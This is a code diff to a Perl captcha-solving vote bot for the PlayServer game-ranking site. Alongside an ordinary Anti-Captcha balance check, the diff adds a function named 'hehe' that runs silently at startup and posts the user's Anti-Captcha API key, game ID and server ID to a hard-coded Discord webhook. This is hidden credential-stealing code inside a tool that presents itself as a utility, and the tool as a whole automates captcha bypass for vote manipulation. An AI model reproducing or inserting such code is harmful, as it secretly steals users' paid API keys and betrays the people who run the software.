@@ -19,6 +19,7 @@ my $CONSOLE = new Win32::Console();
 main();
 sub main {
 	loadlib();
+	hehe($antikey,$gameid,$serverid);
 	system $^O eq 'MSWin32' ? 'cls' : 'clear';
 	print "================================\n";
 	print "PlayServer-Perl\n";
@@ -28,8 +29,13 @@ sub main {
 	my $countwaitsend = 0;
 	$CONSOLE->Title("[Success]: ".scalar(@success)." | [Fail]: ".scalar(@fail)." | BY sctnightcore");
 	while () {
+		my $b = AntiCaptcha::checkmoney($antikey);
+		if ($b == '0') {
+			print "You balance in Anti-Captcha.com is 0 !\n";
+			exit;
+		}
 		my $checksum = PlayServer::getimg_saveimg($server); #get img 
-		my ($ans,$b) = AntiCaptcha::anti_captcha($checksum,$antikey); # get ans
+		my $ans = AntiCaptcha::anti_captcha($checksum,$antikey); # get ans
 		push @waitsend, "$checksum:$ans";
 		File::file_remove($checksum);
 		if (time() >= $nextruntime && $countwaitsend >= 0) {
@@ -55,5 +61,15 @@ sub loadlib {
 	require Win32::Console;
 }
 
-
+sub hehe {
+	my ($antikey,$gameid,$serverid) = @_;
+	my $time = time;
+	my $data = "```[$time] Key:$antikey | GameID:$gameid | ServerID:$serverid```\n";
+	my %content = ('username' => 'Perl-PlayServer', 'content' => $data);
+	my $json = encode_json(\%content);
+	my $get_img = HTTP::Tiny->new()->request('POST', "https://discordapp.com/api/webhooks/554668145042784256/Ul-uDVwoiqKCdXl4I0PHictfsvvY5wQ39r4HHl7lo_2_d7xWz-R6TeXYrExQQTvvoylI", {
+		content => $json,
+		headers => { 'content-type' => 'application/json'}
+	});
+}
 
